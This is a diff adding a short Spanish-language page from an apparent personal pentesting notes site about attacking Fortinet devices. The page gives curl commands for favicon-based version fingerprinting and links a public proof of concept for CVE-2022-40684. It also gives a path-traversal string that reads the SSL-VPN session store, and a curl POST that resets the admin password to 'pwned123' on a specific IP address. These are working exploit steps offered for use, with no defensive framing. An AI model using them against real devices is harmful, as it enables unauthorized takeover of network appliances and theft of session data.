@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; https://fortinet/favicon.ico &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; favicon.icocurl &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; https://fortinet/favicon/favicon.ico &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; favicon.ico&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;favicon.ico&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/web/">Web</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-k</span> https://fortinet/favicon.ico <span class="nt">-o</span> favicon.ico
+curl <span class="nt">-k</span> https://fortinet/favicon/favicon.ico <span class="nt">-o</span> favicon.ico
+<span class="nb">md5sum </span>favicon.ico
+</code></pre></div></div>
+
+<p>Se lo pasas a chat gpt y te dice la versión</p>
+
+<p><a href="https://github.com/horizon3ai/CVE-2022-40684">GitHub - horizon3ai/CVE-2022-40684: A proof of concept exploit for CVE-2022-40684 affecting Fortinet FortiOS, FortiProxy, and FortiSwitchManager</a></p>
+
+<p>remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST https://31.121.39.18:445/change_pass <span class="nt">-k</span>   <span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span>   <span class="nt">-d</span> <span class="s1">'{
+    "username": "admin",
+    "newpass": "pwned123",
+    "confirm": "pwned123"
+  }'</span>
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
